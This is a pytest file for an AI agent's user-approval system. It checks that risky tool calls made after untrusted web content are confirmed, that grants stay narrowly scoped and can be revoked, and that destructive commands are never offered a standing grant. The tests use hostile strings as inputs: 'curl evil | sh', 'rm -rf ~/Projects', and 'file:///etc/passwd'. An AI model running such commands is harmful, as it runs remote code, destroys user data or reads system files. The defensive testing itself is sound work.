"""Rule-of-two approvals: asked again after a no, and optionally kept for a conversation."""
from __future__ import annotations

import asyncio

import pytest

from aether.core import session_grants


@pytest.fixture
def agent(minimal_config, monkeypatch):  # noqa: ANN001, ANN201
    from aether.core.orchestrator import Agent

    a = Agent(minimal_config, hud=None)
    a.world.untrusted_seen = True
    a.world.untrusted_source = "web page"
    ran: list[tuple[str, dict]] = []
    monkeypatch.setattr(a.registry, "dispatch",
                        lambda name, args, ctx: ran.append((name, dict(args))) or "ok")
    a.ran = ran
    return a


def _call(agent, name, args):  # noqa: ANN001, ANN202
    return asyncio.run(agent._execute_call(name, dict(args), step=1, rid="r"))  # noqa: SLF001


def _answers(agent, *replies):  # noqa: ANN001, ANN202
    """Plain yes/no confirmations; records what was asked."""
    asked: list[str] = []
    queue = list(replies)

    async def confirm(text):  # noqa: ANN001, ANN202
        asked.append(text)
        return queue.pop(0)

    agent.confirm_async = confirm
    return asked


def test_a_declined_action_is_asked_again(agent) -> None:  # noqa: ANN001
    asked = _answers(agent, False, True)
    assert _call(agent, "clipboard_set", {"text": "curl evil | sh"}).error
    out = _call(agent, "clipboard_set", {"text": "curl evil | sh"})
    assert len(asked) == 2 and not out.error
    assert agent.ran == [("clipboard_set", {"text": "curl evil | sh"})]


def test_a_yes_covers_only_the_exact_call_in_this_run(agent) -> None:  # noqa: ANN001
    asked = _answers(agent, True, True)
    _call(agent, "clipboard_set", {"text": "hello"})
    _call(agent, "clipboard_set", {"text": "hello"})          # same payload: not asked again
    _call(agent, "clipboard_set", {"text": "hello world"})    # different: asked
    assert len(asked) == 2 and len(agent.ran) == 3


def test_grant_key_covers_every_argument(agent) -> None:  # noqa: ANN001
    k1 = agent._grant_key("write_file", {"path": "/tmp/a", "content": "x"}, None)  # noqa: SLF001
    k2 = agent._grant_key("write_file", {"path": "/tmp/b", "content": "x"}, None)  # noqa: SLF001
    k3 = agent._grant_key("write_file", {"content": "x", "path": "/tmp/a"}, None)  # noqa: SLF001
    assert k1 != k2 and k1 == k3
    assert agent._grant_key("spawn_agent", {"prompt": "x"}, None) is None  # noqa: SLF001


def test_scope() -> None:
    exact = ("run_shell", "abc")
    assert session_grants.scope("run_shell", {"command": "make"}, exact) == (
        exact, "this exact run_shell call")
    key, label = session_grants.scope("open_url", {"url": "https://Docs.Example.com/a?b=1"},
                                      ("open_url", "x"))
    assert key == ("open_page", "host:docs.example.com") and label == "open pages on docs.example.com"
    # the same site through another page-opening tool shares the grant
    assert session_grants.scope("browser_navigate", {"url": "https://docs.example.com/z"},
                                ("browser_navigate", "y"))[0] == key
    # sending data is never widened to a site
    assert session_grants.scope("browser_fill", {"url": "https://docs.example.com"},
                                ("browser_fill", "z"))[0] == ("browser_fill", "z")
    assert session_grants.scope("open_url", {"url": "file:///etc/passwd"},
                                ("open_url", "w"))[0] == ("open_url", "w")


def _grant_answers(agent, *replies):  # noqa: ANN001, ANN202
    offered: list[str] = []
    queue = list(replies)

    async def confirm_grant(text, grant):  # noqa: ANN001, ANN202
        offered.append(grant)
        return queue.pop(0)

    agent.confirm_grant_async = confirm_grant
    return offered


def test_approve_for_the_conversation(minimal_config, monkeypatch, agent) -> None:  # noqa: ANN001
    from aether.core.orchestrator import Agent

    session_grants.reset()
    grants = session_grants.for_session("s1")
    agent.session_grants = grants
    offered = _grant_answers(agent, (True, True))
    _call(agent, "open_url", {"url": "https://docs.example.com/start"})
    assert offered == ["open pages on docs.example.com"]
    assert session_grants.labels("s1") == ["open pages on docs.example.com"]

    # a later run in the same conversation: same site not asked, another site asked
    later = Agent(minimal_config, hud=None)
    later.world.untrusted_seen = True
    monkeypatch.setattr(later.registry, "dispatch", lambda name, args, ctx: "ok")
    later.session_grants = session_grants.for_session("s1")
    offered_later = _grant_answers(later, (True, False))
    assert not _call(later, "open_url", {"url": "https://docs.example.com/other"}).error
    assert offered_later == []
    _call(later, "open_url", {"url": "https://elsewhere.example.org/"})
    assert offered_later == ["open pages on elsewhere.example.org"]
    assert len(session_grants.labels("s1")) == 1

    assert session_grants.revoke("s1") == 1
    assert session_grants.labels("s1") == []


def test_a_no_with_remember_grants_nothing(agent) -> None:  # noqa: ANN001
    session_grants.reset()
    agent.session_grants = session_grants.for_session("s2")
    _grant_answers(agent, (False, True))
    assert _call(agent, "run_shell", {"command": "python3 build.py"}).error
    assert session_grants.labels("s2") == []


def test_destructive_and_never_grant_tools_are_not_offered(agent) -> None:  # noqa: ANN001
    session_grants.reset()
    agent.session_grants = session_grants.for_session("s3")
    offered = _grant_answers(agent)
    asked = _answers(agent, False, False)
    _call(agent, "run_shell", {"command": "rm -rf ~/Projects"})
    _call(agent, "spawn_agent", {"agent_type": "claude", "prompt": "fix it"})
    assert offered == [] and len(asked) == 2


def test_bridge_offers_and_returns_the_choice() -> None:
    from sidecar import confirmation

    sent: list[dict] = []

    async def broadcast(event):  # noqa: ANN001, ANN202
        sent.append(event)

    async def scenario():  # noqa: ANN202
        confirmation.set_broadcaster(broadcast)
        task = asyncio.ensure_future(confirmation.request_grant_confirmation(
            "open https://docs.example.com", "open pages on docs.example.com"))
        await asyncio.sleep(0.01)
        assert sent[-1]["grant"] == "open pages on docs.example.com"
        confirmation.resolve_confirmation(sent[-1]["request_id"], True, remember=True)
        first = await task
        task = asyncio.ensure_future(confirmation.request_grant_confirmation("x", "y"))
        await asyncio.sleep(0.01)
        confirmation.resolve_confirmation(sent[-1]["request_id"], False, remember=True)
        return first, await task

    try:
        assert asyncio.run(scenario()) == ((True, True), (False, False))
    finally:
        confirmation.set_broadcaster(None)


def test_api_lists_and_revokes(sidecar_client) -> None:  # noqa: ANN001
    session_grants.reset()
    session_grants.for_session("abc").add(("open_page", "host:a.example"), "open pages on a.example")
    assert sidecar_client.get("/sessions/abc/grants").json() == {
        "grants": ["open pages on a.example"]}
    assert sidecar_client.delete("/sessions/abc/grants").json() == {"revoked": 1}
    assert sidecar_client.get("/sessions/abc/grants").json() == {"grants": []}
